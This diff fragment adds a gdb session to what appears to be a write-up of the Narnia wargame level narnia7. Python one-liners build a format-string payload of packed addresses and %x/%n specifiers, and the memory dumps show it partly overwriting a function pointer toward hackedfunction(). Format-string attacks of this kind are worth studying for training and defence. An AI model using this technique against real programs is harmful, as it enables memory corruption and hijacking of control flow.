@@ -153,4 +153,48 @@ exit(0 <unfinished ...>
 +++ exited (status 0) +++
 >```
 >
-> TODO
+>```
+(gdb) run $(python -c 'print "\x0c\xd6\xff\xffJUNK\x0d\xd6\xff\xffJUNK\x0e\xd6\xff\xffJUNK\x0f\xd6\xff\xff"+"%x%x%x%x%8x%n"')
+Starting program: /games/narnia/narnia7 $(python -c 'print "\x0c\xd6\xff\xffJUNK\x0d\xd6\xff\xffJUNK\x0e\xd6\xff\xffJUNK\x0f\xd6\xff\xff"+"%x%x%x%x%8x%n"')
+goodfunction() = 0x80486e0
+hackedfunction() = 0x8048706
+>
+before : ptrf() = 0x80486e0 (0xffffd60c)
+I guess you want to come to the hackedfunction...
+>
+Breakpoint 1, 0x08048685 in vuln ()
+(gdb) x/10x 0xffffd60c
+0xffffd60c:	0x0000003c	0xffffd60c	0x4b4e554a	0xffffd60d
+0xffffd61c:	0x4b4e554a	0xffffd60e	0x4b4e554a	0xffffd60f
+0xffffd62c:	0x38343038	0x66383332
+(gdb) p 0x106-0x3c+8
+$3 = 210
+(gdb) run $(python -c 'print "\x0c\xd6\xff\xffJUNK\x0d\xd6\xff\xffJUNK\x0e\xd6\xff\xffJUNK\x0f\xd6\xff\xff"+"%x%x%x%x%210x%n"')
+Starting program: /games/narnia/narnia7 $(python -c 'print "\x0c\xd6\xff\xffJUNK\x0d\xd6\xff\xffJUNK\x0e\xd6\xff\xffJUNK\x0f\xd6\xff\xff"+"%x%x%x%x%210x%n"')
+goodfunction() = 0x80486e0
+hackedfunction() = 0x8048706
+>
+before : ptrf() = 0x80486e0 (0xffffd60c)
+I guess you want to come to the hackedfunction...
+>
+Breakpoint 1, 0x08048685 in vuln ()
+(gdb) x/10x 0xffffd60c
+0xffffd60c:	0x00000106	0xffffd60c	0x4b4e554a	0xffffd60d
+0xffffd61c:	0x4b4e554a	0xffffd60e	0x4b4e554a	0xffffd60f
+0xffffd62c:	0x38343038	0x66383332
+(gdb) p 0x187-0x106
+$10 = 129
+(gdb) run $(python -c 'print "\x0c\xd6\xff\xffJUNK\x0d\xd6\xff\xffJUNK\x0e\xd6\xff\xffJUNK\x0f\xd6\xff\xff"+"%x%x%x%x%210x%n%129x%n"')
+Starting program: /games/narnia/narnia7 $(python -c 'print "\x0c\xd6\xff\xffJUNK\x0d\xd6\xff\xffJUNK\x0e\xd6\xff\xffJUNK\x0f\xd6\xff\xff"+"%x%x%x%x%210x%n%129x%n"')
+goodfunction() = 0x80486e0
+hackedfunction() = 0x8048706
+>
+before : ptrf() = 0x80486e0 (0xffffd5fc)
+I guess you want to come to the hackedfunction...
+>
+Breakpoint 1, 0x08048685 in vuln ()
+(gdb) x/10x 0xffffd60c
+0xffffd60c:	0x00018706	0xffffd600	0x4b4e554a	0xffffd60f
+0xffffd61c:	0x38343038	0x66383332	0x64666666	0x66383536
+0xffffd62c:	0x64666637	0x30343961
+>```
